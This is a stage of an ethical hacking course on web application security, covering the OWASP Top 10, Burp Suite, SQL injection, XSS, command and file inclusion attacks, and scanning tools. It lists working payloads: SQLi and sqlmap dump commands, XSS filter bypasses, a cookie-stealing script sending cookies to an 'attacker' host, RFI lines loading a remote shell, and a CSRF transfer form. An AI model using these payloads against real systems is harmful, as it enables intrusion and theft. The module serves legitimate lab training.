# Stage 07 — Web Application Security
## Testing Web Applications for Common Vulnerabilities

**Certified Ethical Hacking I Learning Path**  
**Audience:** Learners who have completed Stages 00-06

Welcome to Stage 07. Web applications are the most common attack surface in modern environments. This stage covers the OWASP Top 10, web testing methodology, and hands-on testing of common vulnerabilities.

---

## Prerequisites

- [ ] Completed Stages 00-06
- [ ] Understand HTTP protocol
- [ ] Lab environment with DVWA or similar
- [ ] Basic HTML/JavaScript understanding helpful

---

## Why This Stage Matters

Web applications are everywhere—and they're full of vulnerabilities. SQL injection, XSS, and authentication flaws remain consistently exploitable. Web application testing is a core skill for any penetration tester.

---

## What You Will Learn

- Understand the OWASP Top 10 in depth
- Use Burp Suite for web testing
- Test for and exploit SQL injection
- Test for and exploit XSS
- Understand authentication vulnerabilities
- Test for access control issues
- Use automated web scanners

---

## Time Estimate: 45-55 hours

---

## Part 1 — Web Application Architecture (Milestone 1)

### How Web Applications Work

```
┌─────────────────────────────────────────────────────────────────┐
│              Web Application Architecture                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│   CLIENT                    SERVER                              │
│  ┌──────────┐              ┌──────────┐                        │
│  │ Browser  │─── HTTP ────►│Web Server│                        │
│  │          │◄── HTML ─────│ (Apache) │                        │
│  └──────────┘              └────┬─────┘                        │
│                                 │                               │
│                                 ▼                               │
│                           ┌──────────┐                         │
│                           │ App Code │                         │
│                           │  (PHP)   │                         │
│                           └────┬─────┘                         │
│                                 │                               │
│                                 ▼                               │
│                           ┌──────────┐                         │
│                           │ Database │                         │
│                           │ (MySQL)  │                         │
│                           └──────────┘                         │
│                                                                  │
│  ATTACK SURFACE:                                                │
│  • Client-side code (JavaScript)                               │
│  • HTTP requests/responses                                      │
│  • Server-side code                                            │
│  • Database queries                                            │
│  • Authentication/sessions                                      │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### HTTP Request/Response Review

```http
# Request
GET /page.php?id=1 HTTP/1.1
Host: example.com
Cookie: session=abc123
User-Agent: Mozilla/5.0

# Response
HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: session=xyz789

<html>...
```

---

## Part 2 — OWASP Top 10 Deep Dive (Milestone 2)

### A01: Broken Access Control

Users can access resources they shouldn't.

**Examples:**
- Viewing other users' data by changing ID
- Accessing admin functions as regular user
- Bypassing access controls via URL manipulation

**Testing:**
```
# IDOR (Insecure Direct Object Reference)
GET /user/profile?id=123    # Your profile
GET /user/profile?id=124    # Someone else's - should fail

# Forced browsing
GET /admin/               # Should require auth
GET /backup/database.sql  # Should not exist
```

### A02: Cryptographic Failures

Weak or missing encryption of sensitive data.

**Examples:**
- Passwords stored in plaintext
- Sensitive data transmitted over HTTP
- Weak encryption algorithms
- Hardcoded encryption keys

**Testing:**
```bash
# Check for HTTPS
curl -I http://example.com/login

# SSL/TLS analysis
sslscan example.com
nmap --script ssl-enum-ciphers -p 443 example.com
```

### A03: Injection

Untrusted data sent to an interpreter.

**Types:**
- SQL Injection
- Command Injection
- LDAP Injection
- XPath Injection

**SQL Injection Testing:**
```
# Basic test
' OR '1'='1
' OR '1'='1' --
" OR "1"="1

# Error-based
' AND 1=CONVERT(int,@@version)--

# Union-based
' UNION SELECT 1,2,3--
' UNION SELECT username,password,3 FROM users--
```

### A04: Insecure Design

Missing or ineffective security controls.

**Examples:**
- Password reset sends password in email
- Security questions are easily guessable
- No rate limiting on authentication

### A05: Security Misconfiguration

Incorrect security settings.

**Examples:**
- Default credentials
- Unnecessary features enabled
- Error messages exposing information
- Missing security headers

**Testing:**
```bash
# Check headers
curl -I https://example.com

# Look for:
# X-Content-Type-Options
# X-Frame-Options
# Content-Security-Policy
# Strict-Transport-Security
```

### A06: Vulnerable and Outdated Components

Using components with known vulnerabilities.

**Testing:**
```bash
# Identify versions
whatweb http://example.com

# Search for CVEs
searchsploit wordpress 5.0
searchsploit apache 2.4.29
```

### A07: Identification and Authentication Failures

Broken authentication mechanisms.

**Examples:**
- Weak passwords allowed
- Credential stuffing possible
- Session IDs in URL
- Sessions don't expire

**Testing:**
- Test password requirements
- Check session handling
- Test for brute force protection
- Check logout functionality

### A08: Software and Data Integrity Failures

Code and infrastructure without integrity verification.

**Examples:**
- Auto-updates without verification
- Insecure CI/CD pipelines
- Unsigned code

### A09: Security Logging and Monitoring Failures

Insufficient logging for detection.

**Examples:**
- Failed logins not logged
- No alerting on attacks
- Logs stored locally only

### A10: Server-Side Request Forgery (SSRF)

Web application fetches user-supplied URL without validation.

**Testing:**
```
# Try to reach internal resources
http://example.com/fetch?url=http://127.0.0.1:22
http://example.com/fetch?url=http://169.254.169.254/metadata
http://example.com/fetch?url=file:///etc/passwd
```

---

## Part 3 — Burp Suite Fundamentals (Milestone 3)

### Setting Up Burp

1. Start Burp Suite
2. Configure browser proxy (127.0.0.1:8080)
3. Install Burp CA certificate in browser
4. Enable intercept

### Key Features

```
┌─────────────────────────────────────────────────────────────────┐
│                    Burp Suite Components                         │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  PROXY                                                          │
│  ├── Intercept requests/responses                              │
│  ├── Modify on the fly                                         │
│  └── View HTTP history                                         │
│                                                                  │
│  REPEATER                                                       │
│  ├── Manually modify and resend requests                       │
│  └── Compare responses                                          │
│                                                                  │
│  INTRUDER                                                       │
│  ├── Automated attacks                                         │
│  ├── Fuzzing                                                   │
│  └── Brute forcing                                             │
│                                                                  │
│  SCANNER (Pro only)                                             │
│  └── Automated vulnerability scanning                          │
│                                                                  │
│  DECODER                                                        │
│  └── Encode/decode data                                        │
│                                                                  │
│  COMPARER                                                       │
│  └── Compare responses                                          │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### Basic Workflow

1. Browse target with Proxy capturing
2. Review requests in HTTP History
3. Send interesting requests to Repeater
4. Modify and test for vulnerabilities
5. Use Intruder for automated testing

---

## Part 4 — SQL Injection (Milestone 4)

### How SQL Injection Works

```php
# Vulnerable code
$query = "SELECT * FROM users WHERE id = " . $_GET['id'];

# Normal request
/user.php?id=1
Query: SELECT * FROM users WHERE id = 1

# Attack
/user.php?id=1 OR 1=1
Query: SELECT * FROM users WHERE id = 1 OR 1=1
```

### SQL Injection Types

| Type | Description |
|------|-------------|
| In-band (Classic) | Results returned in response |
| Error-based | Database errors reveal info |
| Union-based | UNION queries extract data |
| Blind (Boolean) | True/False responses |
| Blind (Time-based) | Delays indicate success |
| Out-of-band | Data sent externally |

### Testing for SQLi

```
# Basic tests
'
"
1' OR '1'='1
1' OR '1'='1'--
1' OR '1'='1'#
1' OR '1'='1'/*

# Numeric
1 OR 1=1
1 AND 1=2

# Union (find columns)
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

# Extract data
' UNION SELECT username,password,NULL FROM users--
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
```

### SQLMap

```bash
# Basic scan
sqlmap -u "http://target/page.php?id=1"

# With cookie
sqlmap -u "http://target/page.php?id=1" --cookie="session=abc123"

# Enumerate databases
sqlmap -u "http://target/page.php?id=1" --dbs

# Enumerate tables
sqlmap -u "http://target/page.php?id=1" -D database_name --tables

# Dump table
sqlmap -u "http://target/page.php?id=1" -D database_name -T users --dump

# POST request
sqlmap -u "http://target/login" --data="user=admin&pass=test"

# Use Burp request file
sqlmap -r request.txt
```

### Hands-On: SQL Injection

```bash
# Test DVWA SQL Injection
# 1. Set DVWA security to Low
# 2. Go to SQL Injection page
# 3. Test with: ' OR '1'='1

# Using SQLMap
sqlmap -u "http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
    --cookie="security=low; PHPSESSID=xxx" --dbs
```

---

## Part 5 — Cross-Site Scripting (XSS) (Milestone 5)

### How XSS Works

```html
# Vulnerable code
<p>Hello, <?php echo $_GET['name']; ?></p>

# Attack
/page.php?name=<script>alert('XSS')</script>

# Result
<p>Hello, <script>alert('XSS')</script></p>
```

### XSS Types

| Type | Description |
|------|-------------|
| Reflected | Payload in request, reflected in response |
| Stored | Payload stored in database, affects all viewers |
| DOM-based | Payload processed by client-side JavaScript |

### Testing for XSS

```html
# Basic payloads
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>

# Event handlers
" onclick="alert('XSS')
' onmouseover='alert(1)'

# Bypass filters
<ScRiPt>alert('XSS')</ScRiPt>
<script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;('XSS')">

# Cookie stealing
<script>document.location='http://attacker/steal?c='+document.cookie</script>
```

### XSS Impact

- Session hijacking (steal cookies)
- Keylogging
- Phishing
- Malware distribution
- Website defacement

### Hands-On: XSS Testing

```html
# Test DVWA XSS
# Reflected XSS
<script>alert('XSS')</script>

# Stored XSS (in comments/messages)
<script>alert(document.cookie)</script>

# DOM XSS
/page.php#<script>alert('XSS')</script>
```

---

## Part 6 — Other Web Vulnerabilities (Milestone 6)

### Command Injection

```bash
# Vulnerable code
system("ping " . $_GET['ip']);

# Attack
?ip=127.0.0.1; cat /etc/passwd
?ip=127.0.0.1 | id
?ip=127.0.0.1 && whoami
?ip=`id`
```

### Local File Inclusion (LFI)

```
# Attack
?page=../../../../etc/passwd
?page=....//....//....//etc/passwd
?page=/etc/passwd%00
?page=php://filter/convert.base64-encode/resource=config.php
```

### Remote File Inclusion (RFI)

```
# Attack (requires allow_url_include)
?page=http://attacker.com/shell.txt
?page=http://attacker.com/shell.txt%00
```

### CSRF (Cross-Site Request Forgery)

```html
# Malicious page
<form action="http://bank.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit();</script>
```

### Insecure Direct Object Reference (IDOR)

```
# Attack
/api/user/123/profile   # Your profile
/api/user/124/profile   # Someone else's

/download?file=invoice_123.pdf
/download?file=invoice_124.pdf   # Another user's invoice
```

---

## Part 7 — Web Testing Methodology (Milestone 7)

### Testing Workflow

```
┌─────────────────────────────────────────────────────────────────┐
│              Web Application Testing Workflow                    │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  1. RECONNAISSANCE                                              │
│     ├── Identify technologies                                  │
│     ├── Map application                                        │
│     └── Identify entry points                                  │
│                                                                  │
│  2. MAPPING                                                     │
│     ├── Spider/crawl application                               │
│     ├── Identify all parameters                                │
│     └── Note authentication points                             │
│                                                                  │
│  3. DISCOVERY                                                   │
│     ├── Directory brute forcing                                │
│     ├── Parameter fuzzing                                      │
│     └── Hidden functionality                                   │
│                                                                  │
│  4. EXPLOITATION                                                │
│     ├── Test each parameter                                    │
│     ├── Try each vulnerability type                            │
│     └── Document findings                                      │
│                                                                  │
│  5. REPORTING                                                   │
│     ├── Document all findings                                  │
│     ├── Provide proof of concept                               │
│     └── Recommend remediations                                 │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### Directory Brute Forcing

```bash
# Gobuster
gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt

# FFuf
ffuf -u http://target/FUZZ -w /usr/share/wordlists/dirb/common.txt

# Dirb
dirb http://target /usr/share/wordlists/dirb/common.txt
```

### Web Scanning Tools

```bash
# Nikto
nikto -h http://target

# WPScan (WordPress)
wpscan --url http://target

# OWASP ZAP
zaproxy &
```

---

## Stage 07 Assessment

### Written Assessment

1. Explain the OWASP Top 10 categories.
2. What is the difference between reflected and stored XSS?
3. How does SQL injection work? Provide an example.
4. What is IDOR and how do you test for it?
5. How does Burp Suite Repeater work?
6. What is command injection? Give an example payload.
7. How would you test for LFI?
8. What is CSRF and how can it be prevented?
9. What security headers should a web application implement?
10. Describe your web testing methodology.

### Practical Assessment

1. Test DVWA for SQL injection at all security levels
2. Test DVWA for XSS at all security levels
3. Use SQLMap to extract database contents
4. Document all findings with proof of concept
5. Create a web testing report for DVWA

---

## Stage 07 Completion Checklist

- [ ] Understand OWASP Top 10
- [ ] Can use Burp Suite effectively
- [ ] Can test for and exploit SQLi
- [ ] Can use SQLMap
- [ ] Can test for and exploit XSS
- [ ] Understand other web vulnerabilities
- [ ] Can perform directory brute forcing
- [ ] Have web testing methodology

---

## What's Next: Stage 08 Preview

In Stage 08 — Exploitation Fundamentals, you will:
- Learn the Metasploit Framework
- Understand exploits and payloads
- Perform controlled exploitation
- Establish reverse shells

---

**Commit and proceed when ready:**

```bash
cd ~/security-lab
git add .
git commit -m "Complete Stage 07 - Web Application Security"
```
